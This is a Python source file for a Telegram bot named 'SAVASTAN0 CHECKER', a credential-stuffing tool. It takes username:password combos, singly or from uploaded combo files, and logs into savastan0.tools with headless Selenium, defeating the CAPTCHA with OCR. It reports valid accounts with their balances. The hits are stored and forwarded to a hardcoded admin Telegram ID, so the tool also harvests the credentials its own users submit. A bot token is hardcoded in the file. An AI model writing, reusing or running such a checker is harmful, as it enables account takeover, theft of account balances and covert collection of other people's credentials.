import os
import io
import re
import pytesseract
import asyncio
import gzip
import zlib
import brotli
from PIL import Image
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from seleniumwire import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

BOT_TOKEN = "8262206044:AAGYXrhzFQz7bdka7pDBfrV0bIRCEM0CNbE"
ADMIN_ID = 8011959413

hit_records = []

class CheckerBot:
    def __init__(self):
        self.bot = Bot(token=BOT_TOKEN)
        self.app = Application.builder().token(BOT_TOKEN).build()
        self.driver = None
        self.setup_handlers()

    def setup_handlers(self):
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("sav", self.sav_command))
        self.app.add_handler(CommandHandler("upload", self.upload_command))
        self.app.add_handler(CommandHandler("allhits", self.allhits_command))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        self.app.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        text = """🔓 SAVASTAN0 CHECKER

/sav - Check single account
/upload - Bulk check file"""
        await update.message.reply_text(text)

    async def sav_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("Send account in format:\n`username:password`", parse_mode="Markdown")
        context.user_data["waiting"] = "sav"

    async def upload_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("Upload your combo file (.txt user:pass format)")
        context.user_data["waiting"] = "upload"

    async def allhits_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != ADMIN_ID:
            await update.message.reply_text("❌ Not authorized")
            return

        if not hit_records:
            await update.message.reply_text("No hits yet.")
            return

        text = "🔥 ALL HITS:\n\n"
        for h in hit_records:
            text += f"👤 {h['username']} | {h['password']} | 💰 {h['balance']}\n"
        await update.message.reply_text(text[:4000])  # Telegram limit

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if context.user_data.get("waiting") == "sav":
            text = update.message.text.strip()
            if ":" not in text:
                await update.message.reply_text("Invalid format. Use username:password")
                return
            username, password = text.split(":", 1)
            await update.message.reply_text("⚡ Checking...")
            await self.check_account(update, username, password)
            context.user_data["waiting"] = None

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if context.user_data.get("waiting") != "upload":
            return

        document = update.message.document
        if not document.file_name.endswith(".txt"):
            await update.message.reply_text("Only .txt files allowed.")
            return

        file = await document.get_file()
        path = f"temp_{update.effective_user.id}.txt"
        await file.download_to_drive(path)
        await update.message.reply_text("📁 Checking combos... Please wait.")

        await self.process_file(update, path)
        os.remove(path)
        context.user_data["waiting"] = None

    async def check_account(self, update: Update, username, password):
        loop = asyncio.get_event_loop()
        if self.driver is None:
            self.driver = self.get_driver()

        result = await loop.run_in_executor(None, self.check_combo, username, password)
        await self.send_result(update, username, password, result)

    async def process_file(self, update: Update, path):
        with open(path) as f:
            combos = [line.strip().split(":") for line in f if ":" in line]

        total = len(combos)
        hits = 0
        await update.message.reply_text(f"📊 {total} combos found. Starting...")

        for i, (user, pw) in enumerate(combos, start=1):
            res = await asyncio.get_event_loop().run_in_executor(None, self.check_combo, user, pw)
            if "BALANCE" in res:
                hits += 1
                await self.send_result(update, user, pw, res, bulk=True)
            if i % 5 == 0:
                await asyncio.sleep(2)

        await update.message.reply_text(f"✅ Done. Hits found: {hits}")

    def get_driver(self):
        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_argument("--remote-debugging-port=9222")
        chrome_options.add_argument("--window-size=1920,1080")
        
        # For Render free tier
        chrome_options.binary_location = "/usr/bin/google-chrome"

        wire_options = {"disable_encoding": True}
        driver = webdriver.Chrome(options=chrome_options, seleniumwire_options=wire_options)
        driver.scopes = [".*savastan0\\.tools.*"]
        return driver

    def check_combo(self, username, password):
        try:
            d = self.driver
            d.get("https://savastan0.tools/login")
            asyncio.run(asyncio.sleep(2))

            captcha_text = self.solve_captcha(d)
            if not captcha_text:
                return "CAPTCHA failed"

            inputs = d.find_elements(By.TAG_NAME, "input")
            if len(inputs) < 3:
                return "Form not found"

            inputs[0].send_keys(username)
            inputs[1].send_keys(password)
            inputs[2].send_keys(captcha_text)
            d.find_element(By.XPATH, "//button[@type='submit']").click()
            asyncio.run(asyncio.sleep(3))

            for req in d.requests:
                if req.method == "POST" and "/login" in req.url and req.response:
                    body = self.decode_response(req.response)
                    if "incorrect" in body.lower():
                        return "Invalid login"
                    if "balance" in body.lower():
                        d.get("https://savastan0.tools/index")
                        asyncio.run(asyncio.sleep(2))
                        html = d.page_source
                        match = re.search(r"Balance:\s*<strong>(.*?)<", html)
                        bal = match.group(1) if match else "N/A"
                        return f"VALID - BALANCE: {bal}"
            return "Unknown"
        except Exception as e:
            return f"Error: {e}"

    def solve_captcha(self, driver):
        try:
            img_el = driver.find_element(By.XPATH, "//img[contains(@src, 'captcha')]")
            screenshot = driver.get_screenshot_as_png()
            loc = img_el.location
            size = img_el.size
            im = Image.open(io.BytesIO(screenshot))
            crop = im.crop((loc["x"], loc["y"], loc["x"]+size["width"], loc["y"]+size["height"]))
            crop = crop.resize((crop.width * 2, crop.height * 2))
            text = pytesseract.image_to_string(crop, config="--psm 7").strip()
            return text if len(text) >= 4 else None
        except Exception:
            return None

    def decode_response(self, resp):
        raw = resp.body or b""
        enc = resp.headers.get("Content-Encoding", "").lower()
        try:
            if "br" in enc:
                return brotli.decompress(raw).decode("utf-8", "ignore")
            elif "gzip" in enc:
                return gzip.decompress(raw).decode("utf-8", "ignore")
            elif "deflate" in enc:
                return zlib.decompress(raw).decode("utf-8", "ignore")
            else:
                return raw.decode("utf-8", "ignore")
        except:
            return raw.decode("utf-8", "ignore")

    async def send_result(self, update, username, password, result, bulk=False):
        if "BALANCE" in result:
            balance = result.split("BALANCE: ")[-1]
            text = f"""
🎯 HIT FOUND!

👤 Username: {username}
🔑 Password: {password}
💰 Balance: {balance}
"""
            hit_records.append({
                "username": username,
                "password": password,
                "balance": balance,
                "telegram_user": update.effective_user.username or "Unknown"
            })
            await update.message.reply_text(text)
            if not bulk:
                await self.bot.send_message(ADMIN_ID, f"🔥 HIT\n{username}:{password}\n💰 {balance}")
        else:
            await update.message.reply_text(f"{username}:{password} → {result}")

    def run(self):
        self.app.run_polling(close_loop=False)

if __name__ == "__main__":
    # Add this line at the end
    CheckerBot().run()
